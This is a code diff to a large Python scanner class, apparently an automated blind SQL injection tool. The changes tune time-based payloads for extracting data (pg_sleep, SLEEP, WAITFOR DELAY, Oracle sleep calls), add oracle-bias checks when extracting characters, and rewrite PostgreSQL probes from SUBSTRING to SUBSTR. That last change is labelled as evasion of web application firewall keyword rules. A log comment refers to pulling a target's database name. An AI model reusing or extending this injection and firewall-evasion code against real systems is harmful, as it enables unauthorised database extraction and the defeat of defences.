@@ -58216,6 +58216,137 @@ class Scanner:
             _thresh = (ms_true + ms_false) / 2
         LOG.info("[Inference]  Threshold=%.0fms (margin=%.0fms)", _thresh, _margin)
 
+        # BUG-TIMING-EXTRACT-SLEEP-ADAPTIVE FIX (HIGH): Detection payloads use long
+        # sleep values (commonly 5s-10s) chosen by the timing oracle calibrator for
+        # detection reliability.  Extraction inherits the same sleep duration — but
+        # extraction needs hundreds of probes (7 bits × string_length).  A 48-char
+        # database name with a 10s sleep requires:
+        #   7 bits × 10s × 48 chars ≈ 3360s (56 min) — times out on most frameworks.
+        # Log confirmed: database 'jacbblCl...' timed out at char 8 (8×7×10 = 560s).
+        #
+        # Fix: after calibration establishes ms_false (the FALSE-condition RTT), compute
+        # the MINIMUM viable extraction sleep that still produces a reliable oracle:
+        #   min_sleep = max(1.0, ms_false * 2 / 1000.0 + 0.3)
+        # This guarantees:
+        #   expected_margin ≈ min_sleep × 1000ms  (sleep dominates true-condition RTT)
+        #   _min_viable_margin = max(80, min_sleep×1000×0.80)
+        #   expected_margin ≥ _min_viable_margin  (reliable ≥ 80% of sleep)
+        # For ms_false = 349ms: min_sleep = max(1.0, 0.698+0.3) = 1.0s
+        #   → extraction now takes 7×1×48 = 336s (under 600s timeout).
+        #
+        # Guard: only reduce — never increase.  Only apply when:
+        #   1. Timing oracle is active (ms_true > 0 and ms_false > 0)
+        #   2. Reduction is meaningful (new_sleep < 90% of current _delay)
+        #   3. Oracle is not boolean — boolean oracle doesn't use sleep at all
+        #   4. Not an inverted oracle (margin < 0) — skip; polarity inversion is
+        #      complex and the adaptive reduction logic assumes normal polarity.
+        # Template is rebuilt with the new sleep by regex-substitution identical
+        # to the floor-calibration template update at lines ~58327-58358.
+        if (ms_true > 0 and ms_false > 0 and not _boolean_oracle
+                and _margin > 0 and _delay > 1.0):
+            _adaptive_min_sleep = max(1.0, ms_false * 2.0 / 1000.0 + 0.3)
+            if _adaptive_min_sleep < _delay * 0.90:
+                # Rebuild template with reduced sleep — same regex substitutions
+                # as the floor-calibration path to cover all DBMS sleep functions.
+                _template_pre_adaptive = _template
+                _new_delay = _adaptive_min_sleep
+                # 1. pg_sleep(N) — PostgreSQL / CockroachDB / YugabyteDB / Redshift
+                _template = _re.sub(
+                    r'(?i)pg_sleep\s*\(\s*([\d.]+)\s*\)',
+                    lambda _m: f"pg_sleep({_new_delay:.2f})" if float(_m.group(1)) > 0 else _m.group(0),
+                    _template)
+                # 2. SLEEP(N) — MySQL / MariaDB / TiDB / H2
+                _template = _re.sub(
+                    r'(?i)\bSLEEP\s*\(\s*([\d.]+)\s*\)',
+                    lambda _m: f"SLEEP({_new_delay:.2f})" if float(_m.group(1)) > 0 else _m.group(0),
+                    _template)
+                # 3. WAITFOR DELAY 'hh:mm:ss' — MSSQL / Sybase
+                _wf_ad_sec = max(1, int(round(_new_delay)))
+                _wf_ad_mm  = _wf_ad_sec // 60
+                _wf_ad_ss  = _wf_ad_sec % 60
+                _template = _re.sub(
+                    r"(?i)WAITFOR\s+DELAY\s+['\"][\d:]+['\"]",
+                    f"WAITFOR DELAY '0:{_wf_ad_mm:02d}:{_wf_ad_ss:02d}'",
+                    _template)
+                # 4. DBMS_SESSION.SLEEP(N) — Oracle 12c+
+                _template = _re.sub(
+                    r'(?i)DBMS_SESSION\.SLEEP\s*\(\s*([\d.]+)\s*\)',
+                    lambda _m: f"DBMS_SESSION.SLEEP({_new_delay:.2f})" if float(_m.group(1)) > 0 else _m.group(0),
+                    _template)
+                # 5. DBMS_LOCK.SLEEP(N) — Oracle (legacy)
+                _template = _re.sub(
+                    r'(?i)DBMS_LOCK\.SLEEP\s*\(\s*([\d.]+)\s*\)',
+                    lambda _m: f"DBMS_LOCK.SLEEP({_new_delay:.2f})" if float(_m.group(1)) > 0 else _m.group(0),
+                    _template)
+                # 6. ARITHMETIC FORM (BUG-F5-ARITH-TEMPLATE FIX): stacked-query
+                # PostgreSQL uses pg_sleep(N*([INFERENCE])::int) — built at lines
+                # ~56275/56313.  The plain float regex (rule 1) cannot match because
+                # the argument contains non-numeric tokens (*([INFERENCE])::int).
+                _template = _re.sub(
+                    r'(?i)pg_sleep\s*\(\s*([\d.]+)\s*\*\s*\(\[INFERENCE\]\)::int\s*\)',
+                    lambda _m: f"pg_sleep({_new_delay:.2f}*([INFERENCE])::int)" if float(_m.group(1)) > 0 else _m.group(0),
+                    _template)
+                # 7. ARITHMETIC FORM reversed: pg_sleep(([INFERENCE])::int*N) — line ~58049
+                _template = _re.sub(
+                    r'(?i)pg_sleep\s*\(\s*\(\[INFERENCE\]\)::int\s*\*\s*([\d.]+)\s*\)',
+                    lambda _m: f"pg_sleep(([INFERENCE])::int*{_new_delay:.2f})" if float(_m.group(1)) > 0 else _m.group(0),
+                    _template)
+                # 8. MySQL/MariaDB/TiDB arithmetic IF form: IF([INFERENCE],N,0)
+                _template = _re.sub(
+                    r'(?i)\bIF\s*\(\s*\[INFERENCE\]\s*,\s*([\d.]+)\s*,\s*0\s*\)',
+                    lambda _m: f"IF([INFERENCE],{_new_delay:.2f},0)" if float(_m.group(1)) > 0 else _m.group(0),
+                    _template)
+                # 9. MSSQL/Sybase/Oracle CASE WHEN [INFERENCE] THEN N ELSE 0 END
+                _template = _re.sub(
+                    r'(?i)CASE\s+WHEN\s+\[INFERENCE\]\s+THEN\s+([\d.]+)\s+ELSE\s+0\s+END',
+                    lambda _m: f"CASE WHEN [INFERENCE] THEN {_new_delay:.2f} ELSE 0 END" if float(_m.group(1)) > 0 else _m.group(0),
+                    _template)
+                # GUARD (BUG-F5-ARITH-TEMPLATE FIX): if none of the 9 substitutions
+                # matched, the sleep literal is in an unrecognized form.  Committing
+                # _delay/_thresh/_margin without touching the template would project a
+                # threshold calibrated for the reduced sleep (e.g. 863ms) while probes
+                # still take the full original duration (e.g. 10s).  The oracle remains
+                # correct (ms_true >> threshold >> ms_false) but the claimed speedup
+                # never materialises and logged metrics are misleading.  Restore instead.
+                if _template != _template_pre_adaptive:
+                    # Project new expected calibration values (proportional to sleep):
+                    # ms_true_new ≈ _new_delay/_delay × (ms_true - ms_false) + ms_false
+                    _projected_ms_true = (_new_delay / _delay) * (ms_true - ms_false) + ms_false
+                    _projected_margin = _projected_ms_true - ms_false
+                    _projected_thresh = (_projected_ms_true + ms_false) / 2
+                    # Verify the projected margin meets the minimum viable threshold
+                    # for the new sleep duration before committing to the reduction.
+                    _new_min_viable = max(80.0, _new_delay * 1000.0 * 0.80)
+                    if _projected_margin >= _new_min_viable:
+                        _old_delay = _delay
+                        _delay = _new_delay
+                        ms_true = _projected_ms_true
+                        _thresh = _projected_thresh
+                        _margin = _projected_margin
+                        print(f"[+] [Inference] BUG-TIMING-EXTRACT-SLEEP-ADAPTIVE: "
+                              f"reduced extraction sleep {_old_delay:.1f}s → {_delay:.2f}s "
+                              f"(ms_false={ms_false:.0f}ms, projected_margin={_projected_margin:.0f}ms ≥ "
+                              f"min={_new_min_viable:.0f}ms). "
+                              f"Extraction speedup: {_old_delay/_delay:.1f}×. "
+                              f"New threshold={_thresh:.0f}ms",
+                              flush=True)
+                        LOG.info("[Inference] Adaptive sleep reduction: %.1fs → %.2fs "
+                                 "(ms_false=%.0f, proj_margin=%.0f, new_thresh=%.0f)",
+                                 _old_delay, _delay, ms_false, _projected_margin, _thresh)
+                    else:
+                        # Projected margin too low — restore original template
+                        _template = _template_pre_adaptive
+                        LOG.info("[Inference] Adaptive sleep reduction: projected_margin=%.0fms "
+                                 "< min=%.0fms — keeping original sleep %.1fs",
+                                 _projected_margin, _new_min_viable, _delay)
+                else:
+                    # No regex matched the sleep literal — template uses an unrecognized
+                    # arithmetic form.  Keep _delay/_thresh/_margin at the values from
+                    # initial calibration to avoid a threshold/probe-duration mismatch.
+                    LOG.info("[Inference] Adaptive sleep reduction: template sleep literal "
+                             "not matched by any regex (unrecognized form) — keeping "
+                             "original sleep %.1fs", _delay)
+
         # Minimum viable margin: the timing signal must exceed CDN response variance.
         # For pg_sleep(N), the expected TRUE-FALSE delta is ~N*1000ms. If the calibration
         # margin is < 80% of the sleep duration, CDN timing noise exceeds the injection
@@ -60371,7 +60502,31 @@ class Scanner:
                     await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-EXTRACT-CHAR-EQ-SLEEP-PERF FIX
                     continue
                 if r:
-                    return _ch_ext
+                    # BUG-EQCHAR-LATIN1-CONFIRM FIX (MEDIUM): The ASCII loop (above)
+                    # confirms each hit by probing the next _FREQ_CHARS neighbour —
+                    # if that neighbour also returns True, the oracle is biased-True
+                    # and both results are discarded.  The Latin-1 extension loop had
+                    # NO equivalent check: the first Latin-1 char that returned True was
+                    # immediately returned as the final answer.  A biased-True oracle
+                    # (WAF blocking complex SQL → constant small body ≈ True reference)
+                    # would accept chr(233) ['é'] regardless of actual DB data.
+                    # Fix: probe the next entry in _LATIN1_FREQ as a confirmation
+                    # neighbour.  If the neighbour also returns True → oracle biased →
+                    # continue scanning rather than committing to a wrong character.
+                    _latin_idx = _LATIN1_FREQ.index(_latin_val)
+                    _latin_cc_val = _LATIN1_FREQ[(_latin_idx + 1) % len(_LATIN1_FREQ)]
+                    _ch_ext_cc = chr(_latin_cc_val)
+                    _esc_ext_cc = _ch_ext_cc.replace("'", "''")
+                    if _dbms in ("MSSQL", "Sybase"):
+                        _eq_latin_cc_cond = f"{_sub_fn}=N'{_esc_ext_cc}'"
+                    else:
+                        _eq_latin_cc_cond = f"{_sub_fn}='{_esc_ext_cc}'"
+                    _r_lcc = await _cached_eval(_eq_latin_cc_cond)
+                    if _r_lcc is not True:
+                        return _ch_ext  # Confirmed genuine: neighbour not True
+                    # Both returned True → oracle biased; continue to next candidate
+                    await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))
+                    continue
                 await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-EXTRACT-CHAR-EQ-SLEEP-PERF FIX
             return None
 
@@ -62472,15 +62627,21 @@ class Scanner:
                 Last resort: O(n) per char but impossible to block without
                 breaking basic SQL equality entirely."""
                 _ae = {
-                    "PostgreSQL":       f"ASCII(SUBSTRING(({q}) FROM {p} FOR 1))",
-                    "CockroachDB":      f"ASCII(SUBSTRING(({q}) FROM {p} FOR 1))",
+                    # BUG-FALLBACK-EQ-PG-SUBSTR FIX (WAF EVASION): PostgreSQL family was
+                    # using SUBSTRING(q FROM p FOR 1) instead of SUBSTR(q,p,1).  The
+                    # BUG-BW-PG-SUBSTR-CONSISTENCY-FIX already applied this change in
+                    # _extract_char_bitwise but this function was missed.  On WAF-protected
+                    # PostgreSQL targets (e.g. ModSecurity rules that flag the keyword
+                    # SUBSTRING), SUBSTRING FROM/FOR is blocked while SUBSTR passes through.
+                    # Using SUBSTRING here causes every fallback_equality probe to return
+                    # None (WAF-blocked), leaving garbage or empty strings in extraction.
+                    "PostgreSQL":       f"ASCII(SUBSTR(({q}),{p},1))",
+                    "CockroachDB":      f"ASCII(SUBSTR(({q}),{p},1))",
                     # BUG-FALLBACK-EQ-PGCOMPAT FIX: YugabyteDB and Amazon Redshift are
-                    # PG-wire-compatible; they use FROM/FOR SUBSTRING syntax and ASCII()
-                    # returns 0..U+10FFFF. Without explicit entries they fell to the generic
-                    # else: ASCII(SUBSTRING(q,p,1)) (comma syntax) which works but differs
-                    # from the canonical PG form and may fail on strict parser configurations.
-                    "YugabyteDB":       f"ASCII(SUBSTRING(({q}) FROM {p} FOR 1))",
-                    "Amazon Redshift":  f"ASCII(SUBSTRING(({q}) FROM {p} FOR 1))",
+                    # PG-wire-compatible; they support SUBSTR(str,pos,len) identically to
+                    # PostgreSQL. Using SUBSTR avoids the SUBSTRING keyword WAF rule.
+                    "YugabyteDB":       f"ASCII(SUBSTR(({q}),{p},1))",
+                    "Amazon Redshift":  f"ASCII(SUBSTR(({q}),{p},1))",
                     "MySQL":            f"ORD(SUBSTRING(({q}),{p},1))",
                     "MariaDB":          f"ORD(SUBSTRING(({q}),{p},1))",
                     # BUG-FALLBACK-EQ-TIDB FIX: TiDB is MySQL-wire-compatible; ORD() returns
@@ -62626,10 +62787,16 @@ class Scanner:
                 Oracle used: _eval() (single probe, avoids CDN triple-probe caching).
                 """
                 _ae = {
-                    "PostgreSQL":       f"ASCII(SUBSTRING(({q}) FROM {p} FOR 1))",
-                    "CockroachDB":      f"ASCII(SUBSTRING(({q}) FROM {p} FOR 1))",
-                    "YugabyteDB":       f"ASCII(SUBSTRING(({q}) FROM {p} FOR 1))",
-                    "Amazon Redshift":  f"ASCII(SUBSTRING(({q}) FROM {p} FOR 1))",
+                    # BUG-FALLBACK-MODBIT-PG-SUBSTR FIX (WAF EVASION): PostgreSQL family
+                    # was using SUBSTRING(q FROM p FOR 1) instead of SUBSTR(q,p,1).
+                    # Mirrors the BUG-BW-PG-SUBSTR-CONSISTENCY-FIX applied in
+                    # _extract_char_bitwise and BUG-FALLBACK-EQ-PG-SUBSTR FIX in
+                    # _fallback_equality.  WAF rules targeting the SUBSTRING keyword block
+                    # these probes silently, returning None and aborting extraction.
+                    "PostgreSQL":       f"ASCII(SUBSTR(({q}),{p},1))",
+                    "CockroachDB":      f"ASCII(SUBSTR(({q}),{p},1))",
+                    "YugabyteDB":       f"ASCII(SUBSTR(({q}),{p},1))",
+                    "Amazon Redshift":  f"ASCII(SUBSTR(({q}),{p},1))",
                     "MySQL":            f"ORD(SUBSTRING(({q}),{p},1))",
                     "MariaDB":          f"ORD(SUBSTRING(({q}),{p},1))",
                     "TiDB":             f"ORD(SUBSTRING(({q}),{p},1))",
